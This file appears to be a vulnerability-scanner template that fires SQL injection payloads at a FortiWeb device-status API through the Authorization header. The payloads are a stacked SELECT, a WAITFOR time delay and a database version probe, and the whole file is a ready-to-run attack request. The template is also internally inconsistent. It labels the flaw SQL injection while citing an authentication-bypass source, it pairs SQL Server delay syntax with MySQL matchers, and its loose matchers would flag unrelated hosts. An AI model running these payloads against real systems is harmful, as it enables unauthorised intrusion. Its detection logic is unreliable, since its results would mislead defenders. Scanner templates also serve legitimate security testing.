id: fortigate-fortiweb-sqli-cve-2025-52970

info:
  name: FortiWeb - SQL Injection in Device Status API
  author: pentester
  severity: critical
  description: |
    SQL injection vulnerability in FortiWeb's device status API via the Authorization header.
    This can lead to database manipulation and remote code execution.
  reference:
    - https://github.com/Hex00-0x4/FortiWeb-CVE-2025-52970-Authentication-Bypass
  tags: fortinet,fortiweb,sql-injection,rce,api,auth-bypass,cve-2025-52970

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/fabric/device/status"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
      Accept: application/json, text/plain, */*
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Authorization: Bearer ';SELECT/**/1;--
      Connection: close

    matchers:
      - type: word
        words:
          - "200 OK"
          - "401 Unauthorized"
        condition: or
        part: header

      - type: word
        words:
          - "syntax error"
          - "SQL syntax"
          - "MySQL"
          - "MariaDB"
          - "You have an error"
        condition: or
        part: body

    matchers-condition: and

  - method: GET
    path:
      - "{{BaseURL}}/api/fabric/device/status"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
      Accept: application/json, text/plain, */*
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Authorization: Bearer ';WAITFOR/**/DELAY/**/'0:0:10';--
      Connection: close

    matchers:
      - type: dsl
        dsl:
          - "duration>=10"
          - "status_code != 0"

    matchers-condition: and

  - method: GET
    path:
      - "{{BaseURL}}/api/fabric/device/status"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
      Accept: application/json, text/plain, */*
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Authorization: Bearer ';SELECT/**/@@version;--
      Connection: close

    matchers:
      - type: word
        words:
          - "5."
          - "10."
          - "8."
          - "MySQL"
          - "mariadb"
        condition: or
        part: body

      - type: status
        status:
          - 200
          - 500

    matchers-condition: and